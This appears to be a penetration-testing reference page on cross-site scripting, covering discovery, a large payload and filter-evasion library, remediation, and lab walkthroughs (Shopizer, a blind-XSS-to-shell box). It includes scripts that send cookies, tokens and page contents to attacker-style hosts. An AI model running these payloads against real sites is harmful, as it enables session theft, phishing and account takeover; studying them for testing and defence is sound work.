---
type: technique
title: Cross-Site Scripting (XSS)
lang: en
status: active
wstg: ["WSTG-INPV-01", "WSTG-INPV-02", "WSTG-CLNT-01"]
owasp_top10: ["A03:2021"]
owasp_api: []
asvs: ["V1.2.1", "V1.2.3"]
cwe: ["CWE-79"]
attack: []
cvss: ""
sources: [web-200-oswa, pg-construction, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# Cross-Site Scripting (XSS)

**TL;DR** — The app reflects or stores attacker input that the browser then executes as
script in a victim's session and origin. Find where input lands in a page, confirm it
executes in that context, then run JavaScript as the victim (steal session, act as them,
phish). Root cause is missing/incorrect **context-aware output encoding**.

> Framework: **A03:2021 – Injection**, `CWE-79`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).

## Variants

Two axes — where the payload lives, and where it executes:

| | Server-side (payload in server response) | Client-side / DOM (payload never leaves the browser) |
|---|---|---|
| **Reflected** | input echoed straight back in the response | a URL/`location`/`postMessage` value flows into a JS sink |
| **Stored** | input persisted server-side, served to others | input persisted (e.g. `localStorage`) then hits a JS sink |

Stored is higher impact (hits every viewer); DOM XSS needs source→sink analysis in JS
(`location.hash` → `innerHTML`, `eval`, `document.write`).

## Where it applies

Any reflection point: query/POST params, path segments, headers shown back to users,
and — as in the worked example — non-obvious "pretty" URL values. Also anywhere the app
renders previously-stored data (names, comments, filenames, log viewers).

## Discovery / testing

1. **Inject a canary.** Submit a unique harmless marker (e.g. `zqxjcanary`) and find every
   place it lands, in the rendered page **and** the raw source ([[burp-suite|Burp]] search).
2. **Identify the context** at each landing spot: HTML body, tag attribute, inside a
   `<script>`, a URL, or an event handler. The context dictates the break-out.
3. **Break out, minimally.** Try the smallest payload that proves script execution in that
   context:

   ```html
   <script>alert(document.domain)</script>        <!-- HTML body -->
   "><script>alert(document.domain)</script>       <!-- breaking out of an attribute -->
   ' onmouseover='alert(1)                          <!-- event-handler / attribute -->
   <img src=x onerror=alert(document.domain)>       <!-- when <script> is filtered -->
   ```
4. **Probe filters/encoding.** If tags are stripped or encoded, test alternate vectors
   (event handlers, SVG, mixed case, `<svg onload=…>`), and check whether encoding is
   context-appropriate (HTML-encoding does nothing inside a JS string context).

## Exploitation

Prefer loading an **external script** so the payload stays small and your logic lives on
your host:

```html
"><script src="//10.10.14.5/xss.js"></script>
```

```js
// xss.js — run as the victim, in the app's origin
new Image().src = "//10.10.14.5/c?" + encodeURIComponent(document.cookie); // session theft*
fetch("/account", {credentials:"include"})                                 // act as the user
  .then(r => r.text()).then(d => navigator.sendBeacon("//10.10.14.5/x", d));
```
\* fails against `HttpOnly` cookies — pivot to acting *in-session* instead of exfiltrating
the cookie. Other primitives: keylogging (`onkeypress`), reading `localStorage`/saved
form data, and **phishing** — inject a fake login prompt and post the credentials to your
host (works even with HttpOnly, since it's the human you fool).

## DOM XSS: sources & sinks

DOM XSS never touches the server — data flows from a **source** to a dangerous **sink** in
client JavaScript. Trace these:

- **Sources:** `location` (`.hash`, `.search`, `.href`), `document.referrer`, `window.name`,
  `postMessage` data, `localStorage`/`sessionStorage`.
- **Sinks:** `innerHTML`/`outerHTML`, `document.write`, `eval`/`setTimeout("…")`,
  `element.src`/`href` (→ `javascript:`), jQuery `$(…).html()`.

Payload depends on the injection context — carry a per-context set rather than one string:

```html
"><svg onload=alert(document.domain)>     <!-- break out of HTML / an attribute -->
';alert(document.domain)//                 <!-- inside a JS string -->
javascript:alert(document.domain)          <!-- URL / href sink -->
```

## Payload library

Inert; use `alert(document.domain)` to see the execution origin. Exfil hosts generic. Fuller
set: [[payloadsallthethings|PaTT]] + [[hacktricks]].

**HTML body — inject a tag:**

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg/onload=alert`1`>                  <!-- no parens / no spaces -->
<details open ontoggle=alert(1)>        <!-- auto-fires on render -->
<body onpageshow=alert(1)>              <!-- fires without interaction -->
```

**Break out of an attribute:**

```html
"><svg onload=alert(1)>                  <!-- escape value + tag -->
" autofocus onfocus=alert(1) x="         <!-- can't escape the tag: auto-firing handler -->
'-alert(1)-'                             <!-- reflected inside a JS string in an attribute -->
```

**Break out of `<script>` / a JS string:**

```javascript
</script><svg onload=alert(1)>           // HTML parses first — closes the block even inside quotes
';alert(document.domain)//               // terminate the statement
'-alert(document.domain)-'               // exit a quoted string, run, rejoin
`${alert(1)}`                            // inside a template literal
```

**URL / href / `javascript:` sinks:**

```html
javascript:alert(1)
javascript://%0aalert(1)                 <!-- newline defeats naive scheme filters -->
<iframe srcdoc="<svg onload=alert(1)>">
<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">x</a>
```

**In files (upload → stored XSS):** `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`

### WAF / filter evasion

```html
<ScRiPt>alert(1)</ScRiPt>                            <!-- case -->
<scr<script>ipt>alert(1)</scr</script>ipt>           <!-- nested — survives one strip pass -->
<img src onerror=alert(1)>                       <!-- unicode-escaped identifier -->
<a href="&#106;avascript:alert(1)">x</a>              <!-- HTML-entity scheme -->
```

**No parentheses** (whole class — beats `(` filters):

```javascript
alert`1`                                  // tagged template
onerror=alert;throw 1                       // throw feeds the handler its argument
setTimeout`alert\x281\x29`
location='javascript:alert\x281\x29'
```

**CSP bypass angles:** a whitelisted CDN hosting AngularJS/JSONP (`<script src=…angular.js>` +
`{{constructor.constructor('alert(1)')()}}`), `<base href="//attacker/">` to hijack relative
script srcs, or a permitted `data:` / `unsafe-inline`.

### Exfiltration / impact (defanged — reconstruct at test time)

```javascript
new Image().src="//ATTACKER/?c="+document.cookie                 // cookie (fails on HttpOnly)
new Image().src="//ATTACKER/?t="+localStorage.getItem('token')   // bearer token
fetch('/account',{credentials:'include'}).then(r=>r.text())
  .then(d=>navigator.sendBeacon('//ATTACKER',d))                 // act as the user, exfil the page
```
Blind-XSS probe (fires in a page you never see): `"><script src=//ATTACKER></script>`.
Tools: **Dalfox**, **XSStrike**; blind: **ezXSS** / XSSHunter.

## Worked example — Shopizer, reflected XSS via `ref`

From [[web-200-oswa]] (Shopizer e-commerce). Browsing *Products > Handbags* yields a URL
whose value looks path-like, not query-like: `…/category/…?ref=c:2`. Appending a **canary**
(`ref=c:2canary`) and viewing source confirms `ref` is reflected into the page (used by a
`loadCategoryProducts()` script block). Because it lands in an executable context, a
payload appended to `ref` injects a `<script src=…>` that loads `xss.js` from Kali. The
lab then simulates a victim who "blindly enters credentials," so the exploit chains into a
**phishing** capture / session use — and, via the account page, altering the victim's
**shipping address** (a state change performed as the victim).

## Blind XSS & weaponising an admin viewer

**Blind XSS** fires later, in a page *you* never see — an admin panel, a log viewer, a
support-ticket queue. Inject a beacon that phones home so you learn *where* it executed, then
escalate.

Worked example — **Construction** (from [[pg-construction]], OffSec PG box): a public booking
form's `name`/`message` fields are stored unsanitised and later rendered in an **admin
dashboard** → blind stored XSS. Steps:

1. Inject an external-script beacon so the payload stays small:
   ```html
   <script src=//ATTACKER_IP/payload.js></script>
   ```
2. First stage exfiltrates the DOM of wherever it runs (base64) so you can read the admin-only
   page and discover a hidden dashboard URL:
   ```js
   location.href = "//ATTACKER_IP/a?b=" + btoa(document.body.innerHTML);
   ```
3. The dashboard exposes a "run command" endpoint restricted to **localhost**. Since your JS
   runs *in the admin's browser, on localhost*, weaponise it — call the endpoint from the
   victim's context to run a command, then fetch a reverse-shell stager → shell as root:
   ```js
   fetch('http://localhost:3000/run_command',{method:'POST',
     headers:{'Content-Type':'application/x-www-form-urlencoded'},
     body:'cmd=<staged command — reconstruct>'});
   ```

This is XSS as a **pivot**: it runs in-origin in a privileged viewer's session, defeating the
localhost/network restriction the same way it defeats [[csrf]] tokens.

## Confirming impact

Show execution in the app's origin (`alert(document.domain)`), then demonstrate a concrete
action: session/credential capture or a state change performed as the victim. Stored XSS →
note the blast radius (every viewer, incl. admins). Severity Medium–High, higher for stored
or admin-reaching.

## Remediation

- **Context-aware output encoding** on every sink ([[output-encoding]]) — the primary fix;
  rely on a framework's auto-escaping and avoid raw-HTML sinks.
- **Content-Security-Policy** as defence-in-depth ([[content-security-policy]]): block inline
  and off-origin script.
- `HttpOnly` + `Secure` + `SameSite` cookies ([[samesite-cookies]]) to blunt cookie theft.
- For DOM XSS, use safe sinks (`textContent`, not `innerHTML`) and trusted-types.

Note: XSS runs **in the origin**, so it defeats [[csrf]] tokens — an XSS is strictly more
powerful than CSRF.

## Quick checklist

- [ ] Reflect a canary; find every landing spot in the rendered page AND the raw source.
- [ ] Identify each context (HTML body / attribute / `<script>` / URL / event handler).
- [ ] Minimal breakout per context; filtered? → case/nesting, no-paren (`alert\`1\``), encoding, `svg`/`img`.
- [ ] CSP? → whitelisted-CDN gadget / `base` / JSONP. Stored/blind? → external-script beacon.
- [ ] Prove `alert(document.domain)`; then a concrete action (session use / state change as the victim).

## See also

[[csrf]] · [[same-origin-policy]] · [[content-security-policy]] · [[output-encoding]] · [[burp-suite]]

*Sources: [[web-200-oswa]] modules 5–6 (Shopizer); [[pg-construction]] (blind stored XSS → weaponisation); [[payloadsallthethings]] + [[hacktricks]] (per-context library, WAF/no-paren/CSP evasion).*
